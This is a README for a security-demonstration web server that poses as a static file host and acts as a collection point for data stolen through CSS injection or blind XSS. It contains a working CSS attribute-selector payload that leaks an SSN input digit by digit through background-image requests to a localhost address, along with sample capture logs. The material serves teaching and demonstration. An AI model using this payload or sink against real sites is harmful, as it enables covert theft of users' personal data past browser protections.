# Fake File Host (Exfiltration Sink)

This project is a specialized web server used in security demonstrations. It acts as an **exfiltration sink**—a destination for stolen data—while masquerading as a benign static asset host.

## Purpose

In many client-side attacks (like CSS Injection or Blind XSS), an attacker needs to send sensitive data from the victim's browser to a server they control. However, browsers often block suspicious requests (like sending data to an API), and strict Content Security Policies (CSP) might disable `fetch()` or `XMLHttpRequest` to unknown domains.

This server bypasses those suspicions by serving valid **Images**, **Fonts**, **Styles**, and **Scripts**. A browser sees a request for a background image and allows it, unknowingly sending sensitive data in the URL query string.

## How It Works

1. The server listens for requests to standard-looking paths like `/images/background.png` or `/fonts/montserrat.ttf`.
2. When a request arrives, it **logs every detail** (Headers, Query Parameters, Cookies) to the console.
3. It then returns a **valid 200 OK response** with a real file (e.g., a PNG or TTF).

This ensures the browser (and the victim) sees no errors, while the attacker captures the data.

## Example Attack: CSS Injection

A classic use case is extracting data using CSS Attribute Selectors when JavaScript is disabled or blocked.

```css
/* If the SSN starts with '0', the browser tries to load this background image */
input[name="ssn"][value^="0"] { 
    background: url(http://localhost:5280/images/bg.png?digit=0); 
}

/* If the SSN starts with '1', it loads this one instead */
input[name="ssn"][value^="1"] { 
    background: url(http://localhost:5280/images/bg.png?digit=1); 
}
```

When the browser matches the rule, it makes a GET request. The `FakeFileHost` receives it and logs:

```text
=== DATA EXFILTRATION ATTEMPT DETECTED ===
Timestamp: 2023-11-23 10:00:00 UTC
Full URL: http://localhost:5280/images/bg.png?digit=0
...
```

The attacker now knows the first digit is `0`.

## Endpoints

All endpoints log the request details before serving a static file from `assets/`.

| Method | Endpoint | Returns | Description |
|--------|----------|---------|-------------|
| GET | `/fonts/{path}` | `.ttf` | Serves Montserrat font |
| GET | `/images/{path}` | `.png` | Serves a background image |
| GET | `/styles/{path}` | `.css` | Serves a stylesheet |
| GET | `/scripts/{path}` | `.js` | Serves a generic script |

